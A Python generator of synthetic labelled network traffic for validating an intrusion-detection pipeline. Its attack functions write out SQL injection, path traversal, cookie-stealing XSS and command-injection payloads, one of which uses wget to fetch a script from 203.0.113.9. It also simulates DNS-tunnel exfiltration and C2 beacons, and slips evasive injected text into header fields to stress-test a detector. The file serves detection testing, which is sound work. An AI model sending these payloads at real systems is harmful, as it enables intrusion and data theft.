"""Synthetic labelled traffic generator (benign, attacks, injected attacks).

Every session uses a unique (src_ip, src_port) so ground truth can be joined to
Suricata's flow records. Output: a .pcap and a labels.csv.

This is for PIPELINE VALIDATION. For research results replay real datasets
(CIC-IDS2017 / UNSW-NB15 / CIC-IoT2023) through the same pipeline.
"""
import csv
import random
import string
from dataclasses import dataclass

from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, wrpcap

from . import payloads as P

SERVERS = {"web": "10.10.0.20", "api": "10.10.0.21", "shop": "10.10.0.22"}
DNS_SERVER = "10.10.0.53"
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]
BENIGN_PATHS = ["/", "/index.html", "/products", "/products/42", "/cart", "/about",
                "/static/app.js", "/static/style.css", "/images/logo.png", "/api/v1/items?page=2",
                "/news/2026/11/launch", "/contact", "/search?q=laptop+bag"]


@dataclass
class Label:
    src_ip: str
    src_port: int
    dest_ip: str
    dest_port: int
    proto: str
    label: str          # benign | malicious
    category: str       # e.g. sqli, scan, web_browse
    injected: str       # none | train | test | adaptive
    inj_field: str      # where the payload was put


class Gen:
    def __init__(self, seed: int, t0: float = 1_763_000_000.0):
        self.r = random.Random(seed)
        self.pkts = []
        self.labels: list[Label] = []
        self.t = t0
        self.port = 20000
        self.used_ports = set()

    # ---------- helpers ----------
    def _tick(self, dt=None):
        self.t += dt if dt is not None else self.r.uniform(0.001, 0.05)
        return self.t

    def _sport(self):
        self.port += 1
        return self.port

    def _cip(self, attacker=False):
        if attacker and self.r.random() < 0.7:
            return f"203.0.113.{self.r.randint(2, 250)}"
        return f"192.168.1.{self.r.randint(2, 250)}"

    def _add(self, p, dt=None):
        p.time = self._tick(dt)
        self.pkts.append(p)

    def _tcp_session(self, cip, sport, sip, dport, req: bytes, resp: bytes):
        r = self.r
        seq, ack = r.randint(1000, 10**9), r.randint(1000, 10**9)
        E = Ether()
        self._add(E / IP(src=cip, dst=sip) / TCP(sport=sport, dport=dport, flags="S", seq=seq))
        self._add(E / IP(src=sip, dst=cip) / TCP(sport=dport, dport=sport, flags="SA", seq=ack, ack=seq + 1))
        self._add(E / IP(src=cip, dst=sip) / TCP(sport=sport, dport=dport, flags="A", seq=seq + 1, ack=ack + 1))
        self._add(E / IP(src=cip, dst=sip) / TCP(sport=sport, dport=dport, flags="PA", seq=seq + 1, ack=ack + 1) / req)
        cs, ss = seq + 1 + len(req), ack + 1
        # response possibly split into MSS-sized chunks
        for i in range(0, len(resp), 1400):
            chunk = resp[i:i + 1400]
            self._add(E / IP(src=sip, dst=cip) / TCP(sport=dport, dport=sport, flags="PA", seq=ss, ack=cs) / chunk)
            ss += len(chunk)
        self._add(E / IP(src=cip, dst=sip) / TCP(sport=sport, dport=dport, flags="FA", seq=cs, ack=ss))
        self._add(E / IP(src=sip, dst=cip) / TCP(sport=dport, dport=sport, flags="FA", seq=ss, ack=cs + 1))
        self._add(E / IP(src=cip, dst=sip) / TCP(sport=sport, dport=dport, flags="A", seq=cs + 1, ack=ss + 1))

    def _resp(self, code=200, size=None):
        size = size if size is not None else self.r.randint(200, 6000)
        body = "".join(self.r.choices(string.ascii_letters + " \n", k=size)).encode()
        reason = {200: "OK", 302: "Found", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found", 500: "Internal Server Error"}[code]
        return (f"HTTP/1.1 {code} {reason}\r\nServer: nginx\r\nContent-Type: text/html\r\n"
                f"Content-Length: {len(body)}\r\n\r\n").encode() + body

    def http(self, label, category, path, ua=None, method="GET", body=b"", referer=None,
             extra_headers=None, attacker=False, cip=None, server="web", code=200, rsize=None,
             injected="none", inj_field="", dt=None):
        cip = cip or self._cip(attacker)
        sport = self._sport()
        sip = SERVERS[server]
        ua = ua or self.r.choice(UAS)
        hdr = f"{method} {path} HTTP/1.1\r\nHost: {server}.corp.example\r\nUser-Agent: {ua}\r\nAccept: */*\r\n"
        if referer:
            hdr += f"Referer: {referer}\r\n"
        for k, v in (extra_headers or {}).items():
            hdr += f"{k}: {v}\r\n"
        if body:
            hdr += f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
        req = (hdr + "\r\n").encode() + body
        if dt is not None:
            self._tick(dt)
        self._tcp_session(cip, sport, sip, 80, req, self._resp(code, rsize))
        self.labels.append(Label(cip, sport, sip, 80, "TCP", label, category, injected, inj_field))

    def dns(self, label, category, qname, attacker=False, cip=None, injected="none", inj_field="", dt=None):
        cip = cip or self._cip(attacker)
        sport = self._sport()
        qid = self.r.randint(1, 65535)
        if dt is not None:
            self._tick(dt)
        self._add(Ether() / IP(src=cip, dst=DNS_SERVER) / UDP(sport=sport, dport=53) / DNS(id=qid, rd=1, qd=DNSQR(qname=qname)))
        self._add(Ether() / IP(src=DNS_SERVER, dst=cip) / UDP(sport=53, dport=sport) / DNS(id=qid, qr=1, ra=1, rcode=3, qd=DNSQR(qname=qname)))
        self.labels.append(Label(cip, sport, DNS_SERVER, 53, "UDP", label, category, injected, inj_field))

    # ---------- benign ----------
    def benign_web(self):
        self.http("benign", "web_browse", self.r.choice(BENIGN_PATHS), server=self.r.choice(list(SERVERS)),
                  code=self.r.choices([200, 302, 404, 500], [85, 6, 7, 2])[0])

    def benign_api(self):
        body = f"item={self.r.randint(1, 999)}&qty={self.r.randint(1, 5)}".encode()
        self.http("benign", "api_call", "/api/v1/cart", method="POST", body=body, server="api", rsize=self.r.randint(80, 400))

    def benign_download(self):
        self.http("benign", "download", f"/files/report-{self.r.randint(1, 99)}.pdf", rsize=self.r.randint(20000, 60000))

    def benign_dns(self):
        q = self.r.choice(["www.google.com", "github.com", "outlook.office365.com", "cdn.jsdelivr.net",
                           "api.corp.example", "update.microsoft.com", "pypi.org", "slack.com"])
        self.dns("benign", "dns_lookup", q)

    def benign_hard_negative(self):
        t = self.r.choice(P.HARD_NEGATIVE_TEXT)
        if t.startswith("/"):
            self.http("benign", "hard_negative", t)
        else:
            self.http("benign", "hard_negative", self.r.choice(BENIGN_PATHS), ua=t)

    def benign_hard_negative_dns(self):
        self.dns("benign", "hard_negative", self.r.choice(P.HARD_NEGATIVE_DNS))

    # ---------- attacks ----------
    def atk_sqli(self, inj=None):
        p = self.r.choice(["/products?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users--",
                           "/login?user=admin%27%20OR%20%271%27=%271",
                           "/items?cat=2%20AND%20SLEEP(5)--",
                           "/products?id=-1%20UNION%20ALL%20SELECT%20NULL,@@version--"])
        ua = self.r.choice(UAS + ["sqlmap/1.8.2#stable (https://sqlmap.org)"])
        self._attack_http("sqli", p, ua, inj, server="shop")

    def atk_traversal(self, inj=None):
        p = self.r.choice(["/download?file=../../../../etc/passwd", "/static/..%2f..%2f..%2fetc%2fshadow",
                           "/view?page=....//....//etc/passwd"])
        self._attack_http("path_traversal", p, None, inj)

    def atk_xss(self, inj=None):
        p = self.r.choice(["/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
                           "/comment?text=%3Cimg%20src=x%20onerror=alert(1)%3E"])
        self._attack_http("xss", p, None, inj)

    def atk_cmdi(self, inj=None):
        p = self.r.choice(["/ping?host=127.0.0.1;cat%20/etc/passwd", "/tools?cmd=%7Cwget%20http://203.0.113.9/x.sh"])
        self._attack_http("cmd_injection", p, None, inj)

    def _attack_http(self, cat, path, ua, inj, server="web"):
        ua = ua or self.r.choice(UAS)
        referer, extra, tag, field = None, None, "none", ""
        if inj:
            tag, text = inj
            field = "user_agent" if tag == "adaptive" else self.r.choice(["user_agent", "referer", "uri", "xff", "split"])
            if field == "user_agent":
                ua = f"{ua} {text}" if tag != "adaptive" else text
            elif field == "referer":
                referer = "http://" + server + ".corp.example/?note=" + text.replace(" ", "+")
            elif field == "uri":
                path = path + "&note=" + text.replace(" ", "+").replace("#", "")
            elif field == "xff":
                extra = {"X-Forwarded-For": "10.0.0.5, " + text}
            else:  # split across two fields ("context stitching")
                half = len(text) // 2
                ua = f"{ua} {text[:half]}"
                referer = "http://x/?n=" + text[half:].replace(" ", "+")
        self.http("malicious", cat, path, ua=ua, referer=referer, extra_headers=extra, attacker=True,
                  server=server, code=self.r.choice([200, 403, 500]), injected=tag, inj_field=field)

    def atk_bruteforce(self, inj=None):
        cip = self._cip(attacker=True)
        for _ in range(self.r.randint(8, 15)):
            body = f"user=admin&pass={''.join(self.r.choices(string.ascii_lowercase, k=8))}".encode()
            ua, tag, field = "python-requests/2.31.0", "none", ""
            if inj:
                tag, text = inj
                ua, field = (text if tag == "adaptive" else f"python-requests/2.31.0 {text}"), "user_agent"
            self.http("malicious", "bruteforce", "/login", method="POST", body=body, ua=ua, cip=cip,
                      code=401, rsize=self.r.randint(60, 120), injected=tag, inj_field=field, dt=0.2)

    def atk_scan(self):
        cip, sip = self._cip(attacker=True), SERVERS["web"]
        for dport in self.r.sample(range(1, 1024), 12):
            sport = self._sport()
            self._add(Ether() / IP(src=cip, dst=sip) / TCP(sport=sport, dport=dport, flags="S"), dt=0.005)
            self._add(Ether() / IP(src=sip, dst=cip) / TCP(sport=dport, dport=sport, flags="RA"), dt=0.001)
            self.labels.append(Label(cip, sport, sip, dport, "TCP", "malicious", "port_scan", "none", ""))

    def atk_dns_tunnel(self, inj=None):
        cip = self._cip(attacker=False)  # compromised internal host
        for _ in range(self.r.randint(6, 12)):
            chunk = "".join(self.r.choices("0123456789abcdef", k=self.r.choice([40, 50, 60])))
            q, tag, field = f"{chunk}.t.exfil-cdn.xyz", "none", ""
            if inj:
                tag, text = inj
                q, field = f"{chunk[:20]}.{text}.exfil-cdn.xyz", "dns_query"
            self.dns("malicious", "dns_tunnel", q, cip=cip, injected=tag, inj_field=field, dt=0.3)

    def atk_c2_beacon(self, inj=None):
        cip = self._cip(attacker=False)
        bid = "".join(self.r.choices("0123456789abcdef", k=16))
        for _ in range(self.r.randint(5, 9)):
            ua, tag, field = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "none", ""
            if inj:
                tag, text = inj
                ua, field = (text if tag == "adaptive" else f"{ua} {text}"), "user_agent"
            self.http("malicious", "c2_beacon", f"/api/v1/checkin?id={bid}", ua=ua, cip=cip, server="api",
                      rsize=self.r.randint(20, 60), injected=tag, inj_field=field, dt=self.r.gauss(30, 0.5))

    # ---------- build ----------
    def build(self, n_benign: int, n_attack: int, inj_ratio: float, inj_split: str):
        """inj_split: 'train' -> TRAIN templates; 'test' -> TEST + ADAPTIVE templates."""
        r = self.r
        benign_fns = [(self.benign_web, 40), (self.benign_api, 15), (self.benign_download, 8), (self.benign_dns, 25),
                      (self.benign_hard_negative, 9), (self.benign_hard_negative_dns, 3)]
        attack_fns = [self.atk_sqli, self.atk_traversal, self.atk_xss, self.atk_cmdi,
                      self.atk_bruteforce, self.atk_scan, self.atk_dns_tunnel, self.atk_c2_beacon]
        injectable = {self.atk_sqli, self.atk_traversal, self.atk_xss, self.atk_cmdi,
                      self.atk_bruteforce, self.atk_dns_tunnel, self.atk_c2_beacon}

        def pick_inj(fn):
            if fn not in injectable or r.random() > inj_ratio:
                return None
            dns = fn == self.atk_dns_tunnel
            if inj_split == "train":
                return ("train", r.choice(P.DNS_TRAIN_INJECTIONS if dns else P.TRAIN_INJECTIONS))
            if not dns and r.random() < 0.3:
                return ("adaptive", r.choice(P.ADAPTIVE_INJECTIONS))
            return ("test", r.choice(P.DNS_TEST_INJECTIONS if dns else P.TEST_INJECTIONS))

        events = ["b"] * n_benign + ["a"] * n_attack
        r.shuffle(events)
        fns, wts = zip(*benign_fns)
        for e in events:
            if e == "b":
                r.choices(fns, wts)[0]()
            else:
                fn = r.choices(attack_fns, [16, 12, 10, 10, 4, 3, 4, 4])[0]
                fn() if fn == self.atk_scan else fn(pick_inj(fn))

    def write(self, pcap_path, labels_path):
        self.pkts.sort(key=lambda p: p.time)
        wrpcap(pcap_path, self.pkts)
        with open(labels_path, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(Label.__dataclass_fields__.keys())
            for l in self.labels:
                w.writerow(l.__dict__.values())
        return len(self.pkts), len(self.labels)


def generate(out_prefix, seed, n_benign, n_attack, inj_ratio, inj_split):
    g = Gen(seed)
    g.build(n_benign, n_attack, inj_ratio, inj_split)
    return g.write(f"{out_prefix}.pcap", f"{out_prefix}_labels.csv")
